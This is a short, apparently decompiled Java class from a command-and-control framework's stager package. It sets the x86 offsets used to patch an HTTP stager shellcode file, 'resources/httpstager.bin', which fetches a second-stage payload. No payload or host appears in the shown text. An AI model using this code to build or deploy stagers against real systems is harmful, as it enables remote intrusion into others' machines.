package stagers;

import common.ScListener;

public abstract class GenericHTTPStagerX86 extends GenericHTTPStager {
   public GenericHTTPStagerX86(ScListener var1) {
      super(var1);
   }

   public int getExitOffset() {
      return 708;
   }

   public int getPortOffset() {
      return 191;
   }

   public int getSkipOffset() {
      return 736;
   }

   public int getFlagsOffset() {
      return 211;
   }

   public String arch() {
      return "x86";
   }

   public String getStagerFile() {
      return "resources/httpstager.bin";
   }
}
